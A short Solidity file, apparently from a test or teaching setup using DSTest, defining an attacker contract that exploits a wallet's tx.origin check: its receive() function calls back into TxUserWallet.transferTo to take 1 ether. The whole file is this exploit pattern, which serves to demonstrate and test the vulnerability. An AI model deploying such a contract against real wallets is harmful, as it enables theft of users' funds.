pragma solidity ^0.8.0;

import "./TxUserWallet.sol";

/*interface TxUserWalletX {
    function transferTo(address payable dest, uint256 amount) external;
}
*/
contract TxAttackWallet is DSTest {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    fallback() external payable {
        emit log_named_address("fallback", msg.sender);
    }

    receive() external payable {
        TxUserWallet(msg.sender).transferTo(payable(this), 1 ether);
    }
}
